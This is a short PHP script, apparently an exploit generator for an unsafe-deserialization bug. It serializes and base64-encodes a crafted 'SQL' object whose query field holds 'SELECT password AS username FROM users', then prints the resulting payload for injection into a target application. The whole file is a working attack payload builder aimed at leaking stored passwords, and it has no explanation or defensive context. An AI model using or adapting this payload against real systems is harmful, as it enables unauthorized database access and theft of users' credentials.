<?php
class SQL {
    public $query = '';
    public $conn;
}

function make_payload($sql) {
    $obj = new SQL();
    $obj->query = $sql;
    $obj->conn = null;
    return base64_encode(serialize($obj));
}

echo make_payload("SELECT password AS username FROM users"), "\n";
?>